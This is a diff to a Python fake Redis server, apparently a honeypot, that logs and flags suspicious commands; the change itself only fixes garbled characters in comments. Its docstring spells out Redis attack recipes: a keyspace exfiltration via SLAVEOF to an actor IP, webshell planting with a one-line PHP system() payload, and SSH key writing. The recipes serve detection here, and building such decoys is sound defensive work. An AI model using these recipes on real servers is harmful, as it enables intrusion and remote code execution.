@@ -3,21 +3,21 @@ NotTheNet - Fake Redis Server (TCP port 6379)
 
 Why this matters:
     Redis on an exposed port is heavily abused for:
-      - Cryptominer C2       â€” SLAVEOF <actor-ip> to exfiltrate the keyspace
-      - Webshell planting    â€” CONFIG SET dir /var/www + CONFIG SET dbfilename
+      - Cryptominer C2       — SLAVEOF <actor-ip> to exfiltrate the keyspace
+      - Webshell planting    — CONFIG SET dir /var/www + CONFIG SET dbfilename
                                shell.php + SET payload <?php system($_GET[e]); ?>
                                + SAVE to write a file to the web root
-      - Privilege escalation â€” write SSH authorized_keys via CONFIG SET dir
-      - DarkComet/NjRAT      â€” some variants use Redis as a C2 message queue
+      - Privilege escalation — write SSH authorized_keys via CONFIG SET dir
+      - DarkComet/NjRAT      — some variants use Redis as a C2 message queue
 
     This service responds to all common RESP commands and logs every command
     issued.  The SLAVEOF / REPLICAOF and CONFIG SET dir / dbfilename commands
     are explicitly flagged as high-interest in the log.
 
     RESP (Redis Serialization Protocol) is simple enough to parse inline:
-      *N\\r\\n â€” array of N elements
-      $N\\r\\n  â€” bulk string of N bytes
-      +string\\r\\n â€” simple string
+      *N\\r\\n — array of N elements
+      $N\\r\\n  — bulk string of N bytes
+      +string\\r\\n — simple string
       Inline commands: PING\\r\\n (legacy format)
 
 Security notes (OpenSSF):
@@ -66,7 +66,7 @@ class _RedisSession(threading.Thread):
         self.addr = addr
         self._sem = sem
 
-    # â”€â”€ RESP reader â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── RESP reader ──────────────────────────────────────────────────────────
 
     def _readline(self) -> bytes | None:
         """Read until \\r\\n (max 4 KB). Returns line without the terminator."""
@@ -136,7 +136,7 @@ class _RedisSession(threading.Thread):
         # Inline command (legacy, e.g. PING\r\n)
         return line.decode("utf-8", errors="replace").split()
 
-    # â”€â”€ RESP response helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── RESP response helpers ─────────────────────────────────────────────────
 
     def _send(self, data: bytes):
         try:
@@ -211,7 +211,7 @@ class _RedisSession(threading.Thread):
             self._error(f"unknown command '{cmd}'")
         return True
 
-    # â”€â”€ Session main â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    # ── Session main ─────────────────────────────────────────────────────────
 
     def run(self) -> None:
         safe_addr = sanitize_ip(self.addr[0])
